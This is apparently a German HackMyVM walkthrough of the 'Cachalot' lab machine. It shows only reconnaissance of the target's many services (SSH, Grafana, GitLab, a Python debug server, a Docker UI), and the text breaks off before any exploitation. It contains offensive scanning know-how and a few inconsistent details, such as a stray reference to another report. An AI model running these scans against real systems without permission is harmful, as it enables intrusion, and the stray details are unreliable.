<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cachalot - HackMyVM - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
    <div class="header-bg">
        <h1>Cachalot - HackMyVM - Level: Medium - Bericht</h1>
        <div class="level-container">
            <h2 class="level-medium">Medium</h2> <!-- CSS steuert die Farbe (Gelb) -->
            <div class="circle medium"> <!-- Klasse 'medium' fÃ¼r CSS-Steuerung der Segmentfarben (Gelb) -->
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div> <!-- CSS steuert die Hintergrundfarbe (Header-Farbe) -->
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">echo</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">gobuster</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">jq</div>
                <div class="tool-item">git</div>
                <div class="tool-item">searchsploit</div>
                <div class="tool-item">python3</div>
                <div class="tool-item">vi</div>
                <div class="tool-item">Metasploit</div>
                <div class="tool-item">wget</div>
                <div class="tool-item">nc</div>
                <div class="tool-item">Wappalyzer</div>
                <div class="tool-item">CyberChef</div>
                <div class="tool-item">Burpsuite</div>
                <div class="tool-item">docker</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept">Proof of Concept</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <p class="analysis">
                **Analyse:** Wie bei jedem initialen Test beginne ich mit der Netzwerkerkennung, um die IP-Adresse des Zielsystems zu ermitteln. Ich nutze den Befehl `arp-scan -l`, um eine Liste der aktiven Hosts im lokalen Netzwerk zu erhalten. Die Ausgabe pipe ich an `grep "PCS"`, um nach Zeilen zu filtern, die auf VirtualBox-Netzwerkkarten hindeuten ("PCS Systemtechnik"). AnschlieÃŸend verwende ich `awk '{print $1}'`, um die erste Spalte (die IP-Adresse) aus der gefilterten Ausgabe zu extrahieren.
            </p>
            <p class="evaluation">
                **Bewertung:** Der `arp-scan` war schnell und effizient und lieferte umgehend die IP-Adresse des Zielsystems: 192.168.2.215. Die Identifizierung der Virtualisierungsplattform ist fÃ¼r den Kontext des Tests nÃ¼tzlich.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Beginnen Sie lokale Netzwerktests stets mit einem schnellen Discovery-Scan wie `arp-scan`, um die Ziel-IP(s) zu identifizieren.
                <br>**Empfehlung (Admin):** Ãœberwachen Sie Ihr Netzwerk auf unerwarteten ARP-Traffic. Nutzen Sie Netzwerksegmentierung, um die Reichweite solcher Discovery-Scans zu begrenzen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">192.168.2.215</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um die weitere Arbeit mit dem Zielsystem zu vereinfachen, fÃ¼ge ich einen Eintrag fÃ¼r die gefundene IP-Adresse (192.168.2.215) und den erwarteten Hostnamen `cachalot.hmv` zu meiner lokalen `/etc/hosts` Datei hinzu. Dies ermÃ¶glicht mir, den Hostnamen anstelle der IP-Adresse in meinen Befehlen zu verwenden. Ich nutze den `echo`-Befehl mit Umleitung (`>>`) um die Zeile direkt anzuhÃ¤ngen.
            </p>
            <p class="evaluation">
                **Bewertung:** Das HinzufÃ¼gen des Ziels zur hosts-Datei ist ein einfacher, aber effektiver Schritt, der den Workflow wÃ¤hrend des Tests verbessert. Es hat keine Auswirkungen auf die Sicherheit des Zielsystems selbst, optimiert aber die Handhabung der Befehle auf meiner Angreifer-Maschine.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Passen Sie Ihre hosts-Datei frÃ¼hzeitig an, um die Lesbarkeit und Handhabung der Befehle zu verbessern.
                <br>**Empfehlung (Admin):** Dieser Schritt betrifft nur die Angreifer-Maschine. FÃ¼r das Zielsystem irrelevant.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">echo '192.168.2.215      cachalot.hmv' &gt;&gt; /etc/hosts</span></div>
                </div>
                <div class="terminal"><pre></pre></div>
            </div>

            <p class="analysis">
                **Analyse:** Nun fÃ¼hre ich einen umfassenden Portscan auf dem Zielsystem (192.168.2.215) mit Nmap durch. Ich verwende die Optionen `-sS` (SYN-Scan), `-sC` (Standard-Skripte), `-sV` (Versionserkennung), `-p-` (Scan aller 65535 Ports), `-T5` (aggressives Timing) und `-AO` (OS-Erkennung und alle Skripte). Der Scan liefert eine detaillierte Liste aller offenen Ports und der darauf laufenden Dienste.
            </p>
            <p class="evaluation">
                **Bewertung:** Dieser Nmap-Scan lieferte eine sehr interessante und umfangreiche Liste offener Ports: 22 (SSH), 80 (HTTP), 3000 (HTTP), 5022 (SSH), 5080 (HTTP), 8080 (HTTP), 9000 (HTTP). Dies deutet auf eine komplexere Umgebung hin, wahrscheinlich mit Containern oder verschiedenen Diensten, die auf ungewÃ¶hnlichen Ports laufen. Besonders hervorzuheben sind die zwei SSH-Dienste auf unterschiedlichen Ports (22 und 5022) mit unterschiedlichen Versionen und Hostkeys, sowie mehrere HTTP-Dienste (80 Apache, 3000 Grafana, 5080 nginx/GitLab, 8080 BaseHTTPServer, 9000 Golang/Docker UI). Dies gibt mir viele potenzielle AngriffsflÃ¤chen, die ich nun detailliert untersuchen werde.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** FÃ¼hren Sie immer einen vollstÃ¤ndigen Portscan (`-p-`) durch, um versteckte Dienste auf hohen Ports nicht zu Ã¼bersehen. Analysieren Sie jeden offenen Port einzeln mit spezifischen Tools (z.B. Web-Scanner fÃ¼r HTTP-Ports, SSH-Scanner fÃ¼r SSH-Ports).
                <br>**Empfehlung (Admin):** Minimieren Sie die Anzahl offener Ports. Deaktivieren Sie alle Dienste, die nicht unbedingt benÃ¶tigt werden. ÃœberprÃ¼fen Sie die Konfiguration von Diensten auf nicht-standardmÃ¤ÃŸigen Ports. Implementieren Sie eine Firewall, die nur benÃ¶tigten Traffic erlaubt.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.215</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 22:31 CEST</span>
Nmap scan report for cachalot.hmv (192.168.2.215)
<span class="password">Host is up (0.00022s latency).</span>
Not shown: 65528 closed tcp <span class="command">ports</span> (reset)
<span class="command">PORT     STATE SERVICE VERSION</span>
<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
| ssh-hostkey:
|   <span class="command">3072 ba:18:19:f5:08:d0:4d:8a:b2:94:17:79:4c:1e:c4:47 (RSA)</span>
|   <span class="command">256 3e:e8:74:93:18:86:75:82:3d:6b:e6:da:34:b8:7e:2b (ECDSA)</span>
<span class="command">|_  256 81:5c:cf:9f:74:c7:5d:8d:b5:7b:05:76:76:b1:5c:2b (ED25519)</span>
<span class="command">80/tcp   open  http    Apache httpd 2.4.54 ((Debian))</span>
<span class="command">|_http-server-header: Apache/2.4.54 (Debian)</span>
<span class="command">|_http-title: Cachalot</span>
<span class="command">3000/tcp open  http    Grafana http</span>
<span class="command">| http-robots.txt: 1 disallowed entry</span>
<span class="command">|_/</span>
<span class="command">|_http-trane-info: Problem with XML parsing of /evox/about</span>
<span class="command">| http-title: Grafana</span>
<span class="command">|_Requested resource was /login</span>
<span class="command">5022/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span>
| ssh-hostkey:
|   <span class="command">2048 dc:b0:80:64:72:f0:f1:5b:e4:16:0e:d6:02:92:e7:7a (RSA)</span>
|   <span class="command">256 cc:16:14:b9:d2:93:a6:2f:f7:36:a0:d9:56:e3:05:8e (ECDSA)</span>
<span class="command">|_  256 a2:cc:cf:92:29:b9:76:fb:70:2e:c7:9e:2e:60:42:7d (ED25519)</span>
<span class="command">5080/tcp open  http    nginx</span>
<span class="command">|_http-trane-info: Problem with XML parsing of /evox/about</span>
<span class="command">| http-title: Sign in \xC2\xB7 GitLab</span>
<span class="command">|_Requested resource was http://cachalot.hmv:5080/users/sign_in</span>
<span class="command">| http-robots.txt: 53 disallowed entries (15 shown)</span>
<span class="command">| / /autocomplete/users /search /api /admin /profile</span>
<span class="command">| /dashboard /projects/new /groups/new /groups/*/edit /users /help</span>
<span class="command">|_/s/ /snippets/new /snippets/*/edit</span>
<span class="command">8080/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.10)</span>
<span class="command">|_http-trane-info: Problem with XML parsing of /evox/about</span>
<span class="command">|_http-server-header: BaseHTTP/0.3 Python/2.7.10</span>
<span class="command">|_http-title: Debug Server</span>
<span class="command">9000/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span>
<span class="command">|_http-title: containers | docker web-ui</span>
<span class="command">MAC Address: 08:00:27:BE:A3:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
<span class="command">Aggressive OS guesses: OpenWrt 21.02 (Linux 5.4) (96%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (96%), Linux 4.15 - 5.19 (96%), Linux 6.0 (96%), Linux 4.19 (95%), Linux 5.0 - 5.14 (94%), Linux 5.4 - 5.10 (93%), Linux 2.6.32 (93%), Linux 4.15 (93%), Linux 4.19 - 5.15 (93%)</span>
<span class="command">No exact OS matches for host (test conditions non-ideal).</span>
Network Distance: 1 hop
<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>

<span class="command">TRACEROUTE</span>
<span class="command">HOP RTT     ADDRESS</span>
<span class="command">1   0.22 ms cachalot.hmv (192.168.2.215)</span>

<span class="password">OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .</span>
<span class="password">Nmap done: 1 IP address (1 host up) scanned in 16.43 seconds</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um spezifische Web-Schwachstellen auf dem primÃ¤ren Webserver auf Port 80 zu finden, setze ich den Webscanner Nikto ein. Der Befehl `nikto -h http://192.168.2.215` richtet den Scan auf das Ziel.
            </p>
            <p class="evaluation">
                **Bewertung:** Nikto identifizierte auf Port 80 mehrere Ã¼bliche Webserver-Konfigurationsprobleme, darunter fehlende Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`), mÃ¶gliche Inode-Lecks Ã¼ber ETags und das Vorhandensein des Apache-Webserver-Handbuchs (`/manual/`) mit aktiviertem Directory Indexing in `/manual/images/`. Diese sind wichtige Hinweise auf unzureichende HÃ¤rtung des Webservers, auch wenn sie nicht unbedingt zu RCE fÃ¼hren.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** ÃœberprÃ¼fen Sie die Ã¶ffentlich zugÃ¤nglichen Verzeichnisse wie `/manual/images/` auf sensible Dateien. Die fehlenden Sicherheits-Header sollten im Bericht dokumentiert werden.
                <br>**Empfehlung (Admin):** Entfernen Sie das Webserver-Handbuch und alle unnÃ¶tigen Dateien aus dem Webroot. Deaktivieren Sie Directory Indexing. Implementieren Sie die empfohlenen Sicherheits-Header.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">nikto -h http://192.168.2.215</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">- Nikto v2.5.0</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Target IP:          192.168.2.215</span>
<span class="command">+ Target Hostname:    192.168.2.215</span>
<span class="command">+ Target Port:        80</span>
<span class="password">+ Start Time:         2025-06-06 22:31:44 (GMT2)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="command">+ Server: Apache/2.4.54 (Debian)</span>
<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
<span class="password">+ /: Server may leak inodes via ETags, header found with file /, inode: 164, size: 5e2ec7bfeab00, mtime: gzip. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
<span class="command">+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .</span>
<span class="password">+ /manual/: Web server manual found.</span>
<span class="password">+ /manual/images/: Directory indexing found.</span>
<span class="password">+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host</span>
<span class="password">+ End Time:           2025-06-06 22:31:59 (GMT2) (15 seconds)</span>
<span class="password">---------------------------------------------------------------------------</span>
<span class="password">+ 1 host(s) tested</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich setze Gobuster ein, um Verzeichnisse und Dateien auf dem Webserver auf Port 80 zu finden. Ich verwende die Standard-Wordlist, erweitere sie mit einer Vielzahl von Dateierweiterungen (`-x txt,php,...`) und schlieÃŸe bestimmte Fehlercodes aus (`-b '503,404,403'`). Die Option `-e` erweitert den Modus und `--no-error -k` unterdrÃ¼ckt Fehler und ignoriert SSL-Fehler (obwohl hier kein SSL verwendet wird).
            </p>
            <p class="evaluation">
                **Bewertung:** Gobuster bestÃ¤tigte die Existenz von `/index.html` und `/manual`, Letzteres als Weiterleitung (301) auf `/manual/`. Es fand auch `/background.png`. Diese Ergebnisse ergÃ¤nzen die Nikto-Funde und bestÃ¤tigen die Struktur des Webroots auf Port 80. Es wurden keine weiteren unerwarteten Verzeichnisse oder Dateien auf diesem Port gefunden, die sofort ins Auge stechen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Kombinieren Sie immer verschiedene Tools (Nikto, Gobuster/Feroxbuster) fÃ¼r die Web-Enumeration, da sie unterschiedliche StÃ¤rken haben und unterschiedliche Ergebnisse liefern kÃ¶nnen.
                <br>**Empfehlung (Admin):** Entfernen Sie nicht benÃ¶tigte Dateien und Verzeichnisse aus dem Webroot. Konfigurieren Sie den Webserver so, dass er keine Verzeichnisslistings anzeigt.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">gobuster dir -u "http://cachalot.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt" -x txt,php,rar....s.map,pHtml,yaml -b '503,404,403' -e --no-error -k</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">===============================================================</span>
<span class="command">Gobuster v3.6</span>
<span class="command">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
<span class="password">===============================================================</span>
<span class="command">[+] Url:                     http://cachalot.hmv</span>
<span class="command">[+] Method:                  GET</span>
<span class="command">[+] Threads:                 10</span>
<span class="command">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.2-medium.txt</span>
<span class="command">[+] Negative Status codes:   503,404,403</span>
<span class="command">[+] User Agent:              gobuster/3.6</span>
<span class="command">[+] Extensions:              mod,csv,svg,java,gz,conf,deb,phtml,pub,asp,accdb...</span>
<span class="command">[+] Expanded:                true</span>
<span class="command">[+] Timeout:                 10s</span>
<span class="password">===============================================================</span>
<span class="password">Starting gobuster in directory enumeration mode</span>
<span class="password">===============================================================</span>
<span class="command">http://cachalot.hmv/index.html           (Status: 200) [Size: 356]</span>
<span class="command">http://cachalot.hmv/manual               (Status: 301) [Size: 313] [--&gt; http://cachalot.hmv/manual/]</span>
<span class="command">http://cachalot.hmv/background.png       (Status: 200) [Size: 667992]</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich habe eine manuelle Verbindung zum HTTP-Dienst auf Port 8080 hergestellt und dokumentiere den Inhalt der Seite. Basierend auf dem Nmap-Scan ist dies ein `BaseHTTPServer 0.3 (Python 2.7.10)` mit dem Titel "Debug Server". Die Ausgabe zeigt Systeminformationen wie die interne IP-Adresse (`172.17.0.5`), Hostnamen (`35730cbdf3f1`), Home-Verzeichnis (`/root`) und PATH.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Dienst auf Port 8080 ist Ã¤uÃŸerst interessant. Die Bezeichnung "Debug Server" und die preisgegebenen Systeminformationen deuten auf eine nicht-produktive Umgebung hin, die mÃ¶glicherweise weniger gehÃ¤rtet ist. Die interne IP-Adresse (`172.17.0.5`) ist typisch fÃ¼r eine Docker-Umgebung (Standard-Bridge-Netzwerk), was die Ergebnisse des Nmap-Scans, der einen Docker Web UI auf Port 9000 vermutete, untermauert. Das Root-Verzeichnis `/root` und der PATH werden preisgegeben. Dies ist ein wertvoller Fund.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuchen Sie diesen Debug-Server weiter. Gibt es weitere Endpunkte? Gibt es die MÃ¶glichkeit, Befehle auszufÃ¼hren oder Dateien zu lesen/schreiben? Die Tatsache, dass er in einem Docker-Container lÃ¤uft, bedeutet, dass Angriffe auf den Host Ã¼ber diesen Dienst schwieriger sein kÃ¶nnten (Container-Ausbruch nÃ¶tig).
                <br>**Empfehlung (Admin):** Stellen Sie niemals Debug-Dienste oder interne APIs ungeschÃ¼tzt im Netzwerk bereit. Wenn absolut notwendig, beschrÃ¤nken Sie den Zugriff streng (Firewall-Regeln, Authentifizierung). Geben Sie niemals unnÃ¶tige Systeminformationen Ã¼ber Webdienste preis.
            </p>
            <p>
                Untersuchung des Debug-Servers auf Port 8080:
            </p>
            <pre>
<span class="command">http://192.168.2.215:8080/</span>

<span class="command">172.17.0.5  Booted: 9m 45s ago</span>

<span class="command">HOME</span>
    <span class="command">/root</span>
<span class="command">HOSTNAME</span>
    <span class="command">35730cbdf3f1</span>
<span class="command">PATH</span>
    <span class="command">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
</pre>

            <p class="analysis">
                **Analyse:** Ich wiederhole hier die Ausgabe des Nmap-Scans, um eine schnelle Referenz auf alle offenen Ports und die identifizierten Dienste zu haben, da die Enumeration nun auf mehrere Ports abzielt.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Wiederholung dient dazu, die KomplexitÃ¤t des Ziels zu unterstreichen und die Vielfalt der Dienste zu visualisieren, die als Angriffsvektoren dienen kÃ¶nnten. Jeder gelistete Dienst (SSH, Apache, Grafana, nginx, GitLab, Python Debug Server, Docker UI) muss einzeln und in Kombination mit anderen Diensten analysiert werden.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Behalten Sie eine Ãœbersicht Ã¼ber alle gefundenen Dienste. Priorisieren Sie die Ports und Dienste basierend auf ihren bekannten Schwachstellen und ihrer KomplexitÃ¤t (z.B. Webanwendungen sind oft gute erste Ziele).
                <br>**Empfehlung (Admin):** Eine klare Dokumentation aller laufenden Dienste und ihrer Zwecke ist essentiell fÃ¼r die Systemverwaltung und Sicherheit.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.215 |grep open</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
<span class="command">80/tcp   open  http    Apache httpd 2.4.54 ((Debian))</span>
<span class="command">3000/tcp open  http    Grafana http</span>
<span class="command">5022/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)</span>
<span class="command">5080/tcp open  http    nginx</span>
<span class="command">8080/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.10)</span>
<span class="command">9000/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich navigiere im Browser zur Adresse `http://192.168.2.215:5080/users/sign_in`, basierend auf der Nmap-Ausgabe, die einen GitLab-Login auf diesem Port vermutete. Das Bild im Bericht zeigt die Login-Seite von GitLab.
            </p>
            <p class="evaluation">
                **Bewertung:** Die BestÃ¤tigung einer laufenden GitLab-Instanz ist sehr bedeutend. GitLab ist eine komplexe Anwendung, die in der Vergangenheit mehrere kritische Schwachstellen aufwies (insbesondere RCE). Die Version 11.4.7 wurde von Nmap und spÃ¤ter Wappalyzer identifiziert. Dies ist eine spezifische Version, die ich auf bekannte Exploits untersuchen werde. Da es sich um eine Login-Seite handelt, ist Authentifizierung fÃ¼r die meisten Funktionen (und Exploits) erforderlich.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Suchen Sie nach Ã¶ffentlichen Exploits oder bekannten Schwachstellen fÃ¼r GitLab Version 11.4.7. Versuchen Sie, Anmeldedaten (Standard-Anmeldedaten, durch andere Mittel kompromittierte Daten) fÃ¼r die GitLab-Instanz zu finden. Die Analyse der `phpinfo` fÃ¼r den Backdoor Header im Blackhat-Bericht hat gezeigt, wie wichtig es ist, jede Information zu nutzen. Hier werde ich nach Anmeldedaten suchen.
                <br>**Empfehlung (Admin):** Aktualisieren Sie GitLab auf eine nicht anfÃ¤llige Version. Stellen Sie sicher, dass die Standard-Anmeldedaten geÃ¤ndert wurden. Implementieren Sie Multi-Faktor-Authentifizierung, wo mÃ¶glich.
            </p>
            <p>
                Zugriff auf die GitLab-Login-Seite auf Port 5080:
            </p>
            <pre>
<span class="command">http://192.168.2.215:5080/users/sign_in</span>
</pre>
            <img src="gitlab_login.jpg" alt="hier auf dem Bild sieht man die Gitlab login Webseite">
            <p class="analysis">Bildbeschreibung: hier auf dem Bild sieht man die Gitlab login Webseite</p>

            <p class="analysis">
                **Analyse:** Ich betrachte die `robots.txt` Datei fÃ¼r die GitLab-Instanz auf Port 5080. Diese Datei gibt Suchmaschinen-Crawlern Anweisungen, welche Bereiche der Website nicht indiziert werden sollen. Oft enthÃ¤lt sie Pfade zu sensiblen Bereichen, die fÃ¼r einen Angreifer interessant sein kÃ¶nnten.
            </p>
            <p class="evaluation">
                **Bewertung:** Die `robots.txt` fÃ¼r GitLab ist sehr umfangreich und listet viele Pfade auf, die Suchmaschinen meiden sollen (`Disallow:`). Dazu gehÃ¶ren `/admin`, `/profile`, `/dashboard`, `/projects/new`, `/groups/new`, `/users`, `/api` und viele mehr. Diese Liste liefert wertvolle Informationen Ã¼ber die Struktur der GitLab-Anwendung und interessante Endpunkte, die ich spÃ¤ter als authentifizierter Benutzer untersuchen kÃ¶nnte. Die Tatsache, dass einige `robots.txt` EintrÃ¤ge, die eigentlich gesperrt sein sollten (z.B. `/users/sign_in/`, `/search/`, `/help/`), mit Status 200 antworten, ist ein kleiner Hinweis, aber nicht kritisch fÃ¼r die Sicherheit selbst.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** ÃœberprÃ¼fen Sie immer die `robots.txt` Datei auf Webservern. Sie kann wertvolle Informationen Ã¼ber versteckte oder sensible Pfade preisgeben, die manuell oder mit Fuzzing-Tools untersucht werden sollten.
                <br>**Empfehlung (Admin):** VerÃ¶ffentlichen Sie nur die minimal benÃ¶tigten Informationen in `robots.txt`. Beachten Sie, dass dies keine SicherheitsmaÃŸnahme ist, sondern nur eine Richtlinie fÃ¼r Crawler.
            </p>
            <p>
                Analyse der `robots.txt` Datei fÃ¼r die GitLab-Instanz:
            </p>
            <pre>
<span class="command">http://192.168.2.215:5080/robots.txt</span>

# See [Link: http://www.robotstxt.org/robotstxt.html | Ziel: http://www.robotstxt.org/robotstxt.html] for documentation on how to use the robots.txt file
#
# To ban all spiders from the entire site uncomment the next two lines:
# User-Agent: *
# Disallow: /

# Add a 1 second delay between successive requests to the same server, limits resources used by crawler
# Only some crawlers respect this setting, e.g. Googlebot does not
# Crawl-delay: 1

# Based on details in [Link: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb | Ziel: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb], [Link: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing | Ziel: https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing], and using application
<span class="command">User-Agent: *</span>
<span class="command">Disallow: /autocomplete/users</span>
<span class="command">Disallow: /search</span>
<span class="command">Disallow: /api</span>
<span class="command">Disallow: /admin</span>
<span class="command">Disallow: /profile</span>
<span class="command">Disallow: /dashboard</span>
<span class="command">Disallow: /projects/new</span>
<span class="command">Disallow: /groups/new</span>
<span class="command">Disallow: /groups/*/edit</span>
<span class="command">Disallow: /users</span>
<span class="command">Disallow: /help</span>
# Only specifically allow the Sign In page to avoid very ugly search results
<span class="command">Allow: /users/sign_in</span>

# Global snippets
<span class="command">User-Agent: *</span>
<span class="command">Disallow: /s/</span>
<span class="command">Disallow: /snippets/new</span>
<span class="command">Disallow: /snippets/*/edit</span>
<span class="command">Disallow: /snippets/*/raw</span>

# Project details
<span class="command">User-Agent: *</span>
<span class="command">Disallow: /*/*.git</span>
<span class="command">Disallow: /*/*/fork/new</span>
<span class="command">Disallow: /*/*/repository/archive*</span>
<span class="command">Disallow: /*/*/activity</span>
<span class="command">Disallow: /*/*/new</span>
<span class="command">Disallow: /*/*/edit</span>
<span class="command">Disallow: /*/*/raw</span>
<span class="command">Disallow: /*/*/blame</span>
<span class="command">Disallow: /*/*/commits/*/*</span>
<span class="command">Disallow: /*/*/commit/*.patch</span>
<span class="command">Disallow: /*/*/commit/*.diff</span>
<span class="command">Disallow: /*/*/compare</span>
<span class="command">Disallow: /*/*/branches/new</span>
<span class="command">Disallow: /*/*/tags/new</span>
<span class="command">Disallow: /*/*/network</span>
<span class="command">Disallow: /*/*/graphs</span>
<span class="command">Disallow: /*/*/milestones/new</span>
<span class="command">Disallow: /*/*/milestones/*/edit</span>
<span class="command">Disallow: /*/*/issues/new</span>
<span class="command">Disallow: /*/*/issues/*/edit</span>
<span class="command">Disallow: /*/*/merge_requests/new</span>
<span class="command">Disallow: /*/*/merge_requests/*.patch</span>
<span class="command">Disallow: /*/*/merge_requests/*.diff</span>
<span class="command">Disallow: /*/*/merge_requests/*/edit</span>
<span class="command">Disallow: /*/*/merge_requests/*/diffs</span>
<span class="command">Disallow: /*/*/project_members/import</span>
<span class="command">Disallow: /*/*/labels/new</span>
<span class="command">Disallow: /*/*/labels/*/edit</span>
<span class="command">Disallow: /*/*/wikis/*/edit</span>
<span class="command">Disallow: /*/*/snippets/new</span>
<span class="command">Disallow: /*/*/snippets/*/edit</span>
<span class="command">Disallow: /*/*/snippets/*/raw</span>
<span class="command">Disallow: /*/*/deploy_keys</span>
<span class="command">Disallow: /*/*/hooks</span>
<span class="command">Disallow: /*/*/services</span>
<span class="command">Disallow: /*/*/protected_branches</span>
<span class="command">Disallow: /*/*/uploads/</span>
</pre>

            <p class="analysis">
                **Analyse:** Ich setze Feroxbuster ein, um Verzeichnisse und Dateien auf der GitLab-Instanz auf Port 5080 zu enumerieren. Ich verwende die Standard-Wordlist, fÃ¼ge relevante Dateierweiterungen hinzu und filtere die Ergebnisse auf Statuscodes 200, 301, 302.
            </p>
            <p class="evaluation">
                **Bewertung:** Feroxbuster fand zahlreiche Pfade auf Port 5080. Viele der Treffer sind Standard-GitLab-Ressourcen (CSS, JS, HTML-Seiten wie 422.html, 503.html, explore.html) oder API-Endpunkte (z.B. `/users/root/snippets.json`). Interessant ist das Listing von Pfaden, die mit `/users/root/` beginnen (z.B. `/users/root/snippets`, `/users/root/activity`, `/users/root/projects`). Obwohl dies standardmÃ¤ÃŸige GitLab-Endpunkte sind, deuten sie auf die Existenz eines Benutzers "root" hin und geben Einblick in dessen AktivitÃ¤ten und Projekte, falls ich mich authentifizieren kann. Die Umleitung von `/users/root/` zu `/root` ist ebenfalls notiert.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Analysieren Sie die gefundenen Endpunkte, insbesondere die API-Endpunkte, auf potenzielle Informationslecks oder Schwachstellen. Konzentrieren Sie sich auf den Benutzer "root" in GitLab.
